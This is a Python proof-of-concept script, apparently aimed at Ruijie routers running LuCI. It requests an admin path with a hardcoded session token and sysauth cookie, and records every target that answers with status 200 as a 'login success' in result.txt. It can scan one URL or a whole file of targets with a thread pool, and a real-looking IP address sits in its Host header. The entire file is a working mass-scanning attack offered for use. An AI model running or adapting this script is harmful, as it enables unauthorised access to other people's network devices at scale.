#-*- coding: utf-8 -*-
import argparse,sys,requests
from multiprocessing.dummy import  Pool
requests.packages.urllib3.disable_warnings()


def poc(target):
    url = "http://"+target+"/cgi-bin/luci/;stok=625f4e8dc237c74242f0c22b6ce58a7d/admin"
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Cookie": "sysauth=e78cf395ca59be110a033d093ad99087",
        "Host": "123.145.80.18:6060",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
    }
    print(url)
    try:
        res = requests.get(url,headers=headers,verify=False,timeout=10)
        print('==================',res)
        if res.status_code ==200:
            print(f"[+] {target} login successÔºÅ")
            with open("result.txt","a+",encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-] {target} fail")
    except:
            print(f"[*] {target} server error")


def main():
    parser = argparse.ArgumentParser(description='RuiJie command-exec')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt include urls")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(10)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usage:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()
